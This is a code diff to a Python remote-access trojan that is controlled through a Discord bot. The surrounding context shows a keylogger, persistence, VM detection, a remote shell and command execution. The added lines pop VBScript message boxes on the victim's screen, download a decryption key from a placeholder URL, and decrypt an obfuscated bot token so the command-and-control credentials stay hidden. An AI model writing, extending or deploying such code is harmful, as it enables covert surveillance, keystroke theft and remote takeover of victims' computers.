@@ -16,9 +16,14 @@ from PIL import Image
 import keyboard
 from mss import mss
 from datetime import datetime
+from cryptography.fernet import Fernet
+import tempfile
+import threading
 
 FLAG_PATH = "C:\\ProgramData\\FUC Cache"
 INSTALL_PATH = "C:\\ProgramData\\FUC HUB"
+
+DECRYPTION_KEY_URL = "YOUR URL"
 
 first_execution = False
 
@@ -124,7 +129,7 @@ async def on_message(message):  # called when discord message was received
 
                 case "-MB":     # MESSAGE BOX
                     content = content.strip("-MB")
-                    ctypes.windll.user32.MessageBoxW(0, content, "...", 0)
+                    await fulcrum_util.display_message_box(content)
 
 
         case "shell":   # active shell
@@ -140,6 +145,8 @@ async def on_message(message):  # called when discord message was received
 
 
 class FulcrumUtil:
+    def __init__(self):
+        message_boxes = []
     def check_for_vm(self):
         # TODO check for typical vm names
         # TODO find solution to detect the windows defender vm
@@ -147,6 +154,26 @@ class FulcrumUtil:
 
     def run_command(self, command):
         return os.popen(command).read()
+
+    async def display_message_box(self, content):
+        # replace \n with VBScript's newline char
+        content = content.replace('\n', '" & vbCrLf & "')
+
+        # creating a temporary Visual Basic Script that displays the message box
+        with tempfile.NamedTemporaryFile(delete=False, suffix='.vbs') as temp_vbs:
+            vbs_script = f'''
+            Set WshShell = WScript.CreateObject("WScript.Shell")
+            WshShell.Popup "{content}", 0, "...", 0
+            '''
+            temp_vbs.write(vbs_script.encode('utf-8'))
+            temp_vbs_path = temp_vbs.name
+
+        # run the VBScript file with subprocess
+        subprocess.Popen(['wscript', temp_vbs_path], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+
+        # remove the temp file
+        time.sleep(1)
+        os.remove(temp_vbs_path)
 
     async def create_channel(self):
         # create new channel
@@ -282,6 +309,27 @@ class FulcrumUtil:
 
         except Exception as e:
             self.return_error_2_channel(e)
+
+    def _download_file(self, url, name):
+        response = requests.get(url, allow_redirects=True)
+        with open(name, 'wb') as f:
+            for chunk in response.iter_content(chunk_size=8192):
+                # Write each chunk to the file
+                f.write(chunk)
+
+    def decrypt_token(self, token):
+        # downloading the key.key file and decrypting the bot token
+        self._download_file(DECRYPTION_KEY_URL, "key.key")
+
+        with open("key.key", "rb") as f:
+            key = f.readline()
+            cipher = Fernet(key)
+            # remove obfuscation
+            decrypted_token = token.swapcase()[4:-4].encode()
+            # decrypt token
+            decrypted_token = cipher.decrypt(decrypted_token)
+        return decrypted_token.decode()
+
 
 
 class ShellHandler:
@@ -449,7 +497,7 @@ class ProfileManager:
 
 
 def main():
-    global first_execution
+    global first_execution, TOKEN
     global key_logger, persistence_manager, discord_bot_manager, profile_manager, shell_handler, fulcrum_util
     key_logger = KeyLogger()
     profile_manager = ProfileManager()
@@ -478,8 +526,9 @@ def main():
         profile_manager.create_unique_profile()
         first_execution = True
 
-    # starting discord bot
-    client.run(TOKEN)
+    # decrypting token and starting discord bot
+    decrypted_token = fulcrum_util.decrypt_token(str(TOKEN))
+    client.run(decrypted_token)
 
 
 if __name__ == '__main__':
